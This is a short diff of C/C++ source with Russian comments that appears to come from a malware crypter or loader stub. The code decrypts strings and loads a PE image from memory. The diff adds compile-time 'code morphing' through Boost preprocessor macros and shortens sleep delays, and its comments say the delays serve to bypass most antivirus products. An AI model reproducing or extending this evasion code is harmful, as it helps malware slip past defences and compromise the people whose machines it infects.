@@ -8,9 +8,14 @@
 #include "../../modules/modules.h"
 #include "../../modules/data_crypt_string.h"
 
+#include "../../modules/metamorph_code/config.h"
+#include "../../modules/metamorph_code/boost/preprocessor/repetition/repeat_from_to.hpp"
+#include <boost/preprocessor/cat.hpp>
+#include <boost/preprocessor/repetition/repeat_from_to.hpp>
+
 //Дефайн определяет задержку слипов, в данной реализации 1 секунда, два слипа. Т.е. запуск примерно через три секунды.
 //Это позволяет обойти большинство антивирусов.
-#define SLEEP_WAIT 1000
+#define SLEEP_WAIT 50
 
 //Функция раскриптовки строки
 void str_to_decrypt(char *str_to_crypt, uint32_t size_str, uint32_t *key, uint32_t size_key)
@@ -58,6 +63,11 @@ void run(uintptr_t base, LPSTR szFilePath, PVOID pFile, char *decrypt_ntdll, cha
 	LPVOID pImageBase;
 	int Count;
 	IDH = PIMAGE_DOS_HEADER(pFile);
+
+	//Морфинг кода при компиляции************************************************************
+	#define DECL(z, n, text) BOOST_PP_CAT(text, n) ();
+	BOOST_PP_REPEAT_FROM_TO(START_MORPH_CODE, END_MORPH_CODE, DECL, function)
+	//Морфинг кода при компиляции************************************************************
 
 	if (IDH->e_magic == IMAGE_DOS_SIGNATURE)
 	{
